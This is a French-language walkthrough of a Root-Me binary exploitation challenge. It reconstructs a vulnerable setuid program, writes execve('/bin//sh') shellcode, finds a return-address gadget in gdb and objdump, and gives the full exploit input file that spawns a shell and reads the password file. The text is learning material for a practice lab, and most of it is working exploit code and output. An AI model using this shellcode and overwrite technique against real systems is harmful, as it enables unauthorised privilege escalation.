@@ -1,0 +1,244 @@
+
+Pour celui la impossible d'ouvrir le .c donc on va decoder l'assembleur pour refaire nous meme le .c
+$ cat file.c
+void	insert(int nb2, int nb1, int *tab)
+{
+	tab[nb2] = nb1;
+}
+
+int		main(void)
+{
+	FILE	*f;
+	long long	nb1;
+	long long	nb2;
+	int	 		tab[1024];
+	char		buff[20];
+
+	if (ac != 2)
+	{
+		//printf...
+		exit(1);
+	}
+	memset(buf, 0, 20);
+	f = fopen(av[1], "r");
+	if (f == NULL)
+	   return (1);
+	while (fgets(buff, 20, f) != EOF)
+	{
+		nb2 = atoll(buff);
+		fgets(buff, 20, f);
+		nb1 = atoll(buff);
+		if (nb1 == 0 || nb2 == 0)
+		   return (1);
+		insert(nb2, nb1, tab);
+	}
+}
+
+On remarque qu'avant d'appeler la fonction insert,
+l'informaticien check juste que nb1 et nb2 ne sont pas egal a 0,
+mais rien en negatif ;).
+
+On s'ecrit un petit shellcode que l'on injectera dans notre tableau d'int:
+$ cat shell.s
+
+section .text
+global _start
+
+_start:
+		xor    eax,eax
+        push   eax
+        push   0x68732f2f
+        push   0x6e69622f
+        mov    ebx,esp
+		push   eax
+		push   ebx
+		mov    ecx,esp
+		mov    edx,eax
+        mov    al,0xb
+		int    0x80
+		xor    eax,eax
+		inc    eax
+		int    0x80
+
+En gros ca revient a faire:
+int main() {
+	char shell[] = "/bin//sh";
+	execve(shell, NULL, NULL);
+	exit(1);
+}
+
+On le compilera pour qu'il ai les meme caracteristiques que ./ch21:
+$ file ./ch21
+/ch21: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+
+$ nasm -f elf shell.s
+$ ld -m elf_i386 -o shell shell.o
+$ objdump -d ./shell
+
+./shell:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	31 c0					xor    %eax,%eax
+ 8048062:	50                   	push   %eax
+ 8048063:	68 2f 2f 73 68       	push   $0x68732f2f
+ 8048068:	68 2f 62 69 6e       	push   $0x6e69622f
+ 804806d:	89 e3                	mov    %esp,%ebx
+ 804806f:	50                   	push   %eax
+ 8048070:	53                   	push   %ebx
+ 8048071:	89 e1                	mov    %esp,%ecx
+ 8048073:	89 c2                	mov    %eax,%edx
+ 8048075:	b0 0b                	mov    $0xb,%al
+ 8048077:	cd 80                	int    $0x80
+ 8048079:	31 c0                	xor    %eax,%eax
+ 804807b:	40                   	inc    %eax
+ 804807c:	cd 80                	int    $0x80
+ 804807e:	89 c1                	mov    %eax,%ecx
+ 8048080:	89 c2                	mov    %eax,%edx
+
+On a notre shellcode pour apres...
+
+On creer maintenant notre fichier que l'on va passer en parametre:
+Pour linstant on va juste regarder comment insert fonctionne et 
+l'etat de la stack et du base pointeur a ce moment la:
+$ cat /tmp/file
+1234
+1
+5678
+2
+$ gdb ./ch21
+(gdb) b insert
+(gdb) b insert+43
+(gdb) r /tmp/file
+(gdb) c
+(gdb) x/24x $ebp
+0xf2937c08:	0xf2938c68	0x08048682	0x00000001	0x6850c031
+0xf2937c18:	0xf2937c48	0x00000000	0x00000000	0x00000000
+0xf2937c28:	0xf2938d04	0x00000002	0x00000000	0x00000000
+0xf2937c38:	0x00000000	0x00000001	0x6850c031	0x0967e178
+0xf2937c48:	0x90909090	0x00000000	0x00000000	0x00000000
+0xf2937c58:	0x00000000	0x00000000	0x00000000	0x00000000
+ 1ere addr: adresse de fin de tab[1024];
+ 2eme addr: adresse de retour de insert.
+C'est cette valeur qu'il va falloir modifier pour executer notre shellcode. Mais sachant que ladresse de tab[] est random il va falloir faire du ROP.
+(gdb) x/24x $esp
+0xf2937be0:	0x00000001	0xe24bf78d	0xe2636000	0xe24bc95f
+0xf2937bf0:	0xf2938c48	0x00000000	0x0000000a	0xe2636000
+0xf2937c00:	0x00000000	0x00000000	0xf2938c68	0x08048682
+0xf2937c10:	0x00000001	0x6850c031	0xf2937c48	0x00000000
+0xf2937c20:	0x00000000	0x00000000	0xf2938d04	0x00000002
+0xf2937c30:	0x00000000	0x00000000	0x00000000	0x00000001
+
+On y trouve l'adresse de tab[0] 2eme ligne 1ere addr.
+Sachant que l'instruction `leave` dans insert() fera avancer $esp de 1, 
+il nous faut trouver une adresse statique qui pop 2 fois puis ret:
+
+$ objdump -d ./ch21 | grep -B 3 ret
+ 80483b7: e8 54 01 00 00       	call   8048510 <_start+0xb0>
+ 80483bc: e8 7f 03 00 00       	call   8048740 <__i686.get_pc_thunk.bx+0x6>
+ 80483c1: c9                   	leave
+ 80483c2: c3                   	ret
+--
+ 80484a6:	58						pop    %eax
+ 80484a7:	5b                   	pop    %ebx
+ 80484a8:	c9                   	leave
+ 80484a9:	c3                   	ret
+--
+ 80484ff:	83 c4 04				add    $0x4,%esp
+ 8048502:	5b                   	pop    %ebx
+ 8048503:	5d                   	pop    %ebp
+ 8048504:	c3                   	ret
+--
+ 8048528:	c7 04 24 ec 9e 04 08	movl   $0x8049eec,(%esp)
+ 804852f:	ff d0                	call   *%eax
+ 8048531:	c9                   	leave
+ 8048532:	c3                   	ret
+--
+ 804856f:	74 05					je     8048576 <insert+0x42>
+ 8048571:	e8 ce fe ff ff       	call   8048444 <__stack_chk_fail@plt>
+ 8048576:	c9                   	leave
+ 8048577:	c3                   	ret
+--
+ 80486bc:	74 05					je     80486c3 <main+0x14b>
+ 80486be:	e8 81 fd ff ff       	call   8048444 <__stack_chk_fail@plt>
+ 80486c3:	c9                   	leave
+ 80486c4:	c3                   	ret
+--
+ 80486d0:	55						push   %ebp
+ 80486d1:	89 e5                	mov    %esp,%ebp
+ 80486d3:	5d                   	pop    %ebp
+ 80486d4:	c3                   	ret
+--
+ 8048736:	5e						pop    %esi
+ 8048737:	5f                   	pop    %edi
+ 8048738:	5d                   	pop    %ebp
+ 8048739:	c3                   	ret
+
+0804873a <__i686.get_pc_thunk.bx>:
+ 804873a:	8b 1c 24				mov    (%esp),%ebx
+ 804873d:	c3                   	ret
+--
+ 8048764:	83 c4 04				add    $0x4,%esp
+ 8048767:	5b                   	pop    %ebx
+ 8048768:	5d                   	pop    %ebp
+ 8048769:	c3                   	ret
+--
+ 8048784:	59						pop    %ecx
+ 8048785:	5b                   	pop    %ebx
+ 8048786:	c9                   	leave
+ 8048787:	c3                   	ret
+
+=======> 8048737 semble parfait !!!!!
+
+Mais comment ecrire en 0 vu qu'il check la valeur avant dappeler insert ?
+l'assembleur de insert() nous dit :
+...
+ 804855a:	 c1 e0 02             	shl    eax,0x2
+...
+un decalage a gauche de 2 donc si on met 0x40000000 
+un decalage de 2 mettrais, APRES la comparaison, nb1 a 0 !!!!! 
+Mais attention il faut inverser tous les 4 bytes du shellcode vu que
+cest du little endian: trop bien ce rootme non :) ?
+on se rappelle 1ere ligne du fichier cest la valeur de l'assignation et
+la 2eme ligne cest la position dans le tableau:
+HEX to DEC -> 0x90909090 = 2425393296
+	       -> 0x40000000 = 1073741824
+		   -> 0x6850c031 = 1750122545
+		   -> 			   1
+		   etc...
+		   -> 0x08048737 = 134514487
+		   -> 			   -15
+		   jusqu'a la fin ou on va reecrire 0x8048737 en -15, la position de $eip
+
+et bingo
+on a donc:
+$ cat /tmp/file
+2425393296
+1073741824
+1750122545
+1
+1752379183
+2
+1768042344
+3
+1357089134
+4
+2313259347
+5
+3440095426
+6
+1086337408
+7
+32973
+8
+134514487
+-15
+On lance
+$ ./ch21 /tmp/file
+sh-4.3$ cat .passwd
+***********************
+
+:).
+
